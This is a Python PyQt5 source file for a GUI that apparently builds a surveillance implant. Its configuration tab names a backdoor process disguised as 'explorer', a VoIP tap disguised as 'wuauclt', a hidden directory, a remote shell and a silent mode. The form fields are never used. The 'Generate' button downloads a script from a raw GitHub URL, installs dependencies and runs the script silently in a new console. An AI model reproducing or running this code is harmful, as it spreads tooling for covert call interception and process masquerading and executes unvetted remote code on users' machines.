import sys
import os
import subprocess
import urllib.request
from PyQt5.QtWidgets import (
    QApplication, QWidget, QVBoxLayout, QTabWidget, QLabel, QMainWindow, 
    QHBoxLayout, QPushButton, QCheckBox, QLineEdit, QRadioButton, QGroupBox, 
    QComboBox, QSpinBox, QTextEdit
)

# GitHub RAW URL (Change this to your script URL)
GITHUB_SCRIPT_URL = "https://raw.githubusercontent.com/DonateToStream/Test09283/refs/heads/main/gibbity.py"

class MainApp(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle('Main App with 3 Tabs')
        self.setGeometry(100, 100, 800, 600)
        self.init_ui()

    def init_ui(self):
        main_widget = QWidget(self)
        main_layout = QHBoxLayout(main_widget)

        self.tabs = QTabWidget()
        self.tabs.addTab(self.create_tab1(), "Tab 1")
        self.tabs.addTab(self.create_tab("Tab 2"), "Tab 2")
        self.tabs.addTab(self.create_tab("Tab 3"), "Tab 3")

        main_layout.addWidget(self.tabs)
        self.setCentralWidget(main_widget)

    def create_tab1(self):
        tab = QWidget()
        layout = QVBoxLayout()

        layout.addWidget(QLabel("LIID:"))
        self.liid_input = QLineEdit()
        layout.addWidget(self.liid_input)

        layout.addWidget(QLabel("Middleware:"))
        self.middleware_input = QLineEdit()
        layout.addWidget(self.middleware_input)

        layout.addWidget(QLabel("Receiver:"))
        self.receiver_input = QLineEdit()
        layout.addWidget(self.receiver_input)

        layout.addWidget(QLabel("Entertainer:"))
        self.entertainer_input = QLineEdit()
        layout.addWidget(self.entertainer_input)

        layout.addWidget(QLabel("Ring Buffer (MB):"))
        self.ring_buffer_input = QSpinBox()
        self.ring_buffer_input.setRange(1, 10000)
        self.ring_buffer_input.setValue(1000)
        layout.addWidget(self.ring_buffer_input)

        layout.addWidget(QLabel("File Type:"))
        self.file_type_combo = QComboBox()
        self.file_type_combo.addItems(["Option 1", "Option 2", "Option 3"])
        layout.addWidget(self.file_type_combo)

        process_layout = QVBoxLayout()
        process_layout.addWidget(QLabel("Backdoor Process Name:"))
        self.backdoor_input = QLineEdit("explorer")
        process_layout.addWidget(self.backdoor_input)

        process_layout.addWidget(QLabel("VoIP Tap Process Name:"))
        self.voip_input = QLineEdit("wuauclt")
        process_layout.addWidget(self.voip_input)

        process_layout.addWidget(QLabel("Hidden Directory Name:"))
        self.hidden_dir_input = QLineEdit("Applications\\Explorer")
        process_layout.addWidget(self.hidden_dir_input)

        right_group = QGroupBox("Process Configuration")
        right_group.setLayout(process_layout)
        layout.addWidget(right_group)

        def create_radio_group(title, options):
            group = QGroupBox(title)
            group_layout = QHBoxLayout()
            for option in options:
                radio = QRadioButton(option)
                group_layout.addWidget(radio)
            group.setLayout(group_layout)
            return group

        layout.addWidget(create_radio_group("Enable/Disable Entertainer", ["On", "Off"]))
        layout.addWidget(create_radio_group("Sound Quality", ["High", "Low"]))
        layout.addWidget(create_radio_group("Remote Shell", ["On", "Off"]))
        layout.addWidget(create_radio_group("Silent Mode", ["On", "Off"]))

        button_layout = QHBoxLayout()
        self.generate_btn = QPushButton("Generate")
        self.generate_btn.clicked.connect(self.open_download_panel)

        reset_btn = QPushButton("Reset")
        exit_btn = QPushButton("Exit")

        button_layout.addWidget(self.generate_btn)
        button_layout.addWidget(reset_btn)
        button_layout.addWidget(exit_btn)

        layout.addLayout(button_layout)
        tab.setLayout(layout)
        return tab

    def create_tab(self, tab_name):
        tab = QWidget()
        layout = QVBoxLayout()
        layout.addWidget(QLabel(f'Welcome to {tab_name}'))
        tab.setLayout(layout)
        return tab

    def open_download_panel(self):
        self.download_window = DownloadWindow()
        self.download_window.show()


class DownloadWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Downloading Script...")
        self.setGeometry(200, 200, 500, 300)

        layout = QVBoxLayout()
        self.status_label = QLabel("Downloading script...")
        self.log_output = QTextEdit()
        self.log_output.setReadOnly(True)

        layout.addWidget(self.status_label)
        layout.addWidget(self.log_output)

        self.setLayout(layout)

        # Start the download process
        self.download_script()

    def download_script(self):
        script_path = os.path.join(os.getcwd(), "downloaded_script.py")

        try:
            urllib.request.urlretrieve(GITHUB_SCRIPT_URL, script_path)
            self.log_output.append("Script downloaded successfully.")
            self.status_label.setText("Installing dependencies...")

            self.install_dependencies(script_path)
        except Exception as e:
            self.log_output.append(f"Download failed: {str(e)}")
            self.status_label.setText("Download failed.")

    def install_dependencies(self, script_path):
        try:
            subprocess.run(["pip", "install", "-r", "requirements.txt"], check=True)
            self.log_output.append("Dependencies installed successfully.")
            self.status_label.setText("Running script...")

            self.run_script(script_path)
        except subprocess.CalledProcessError as e:
            self.log_output.append(f"Failed to install dependencies: {str(e)}")
            self.status_label.setText("Dependency installation failed.")

    def run_script(self, script_path):
        try:
            subprocess.Popen(["python", script_path], creationflags=subprocess.CREATE_NEW_CONSOLE)
            self.log_output.append("Script is now running.")
            self.status_label.setText("Script running successfully.")
        except Exception as e:
            self.log_output.append(f"Failed to run script: {str(e)}")
            self.status_label.setText("Script execution failed.")


if __name__ == '__main__':
    app = QApplication(sys.argv)
    main_app = MainApp()
    main_app.show()
    sys.exit(app.exec_())
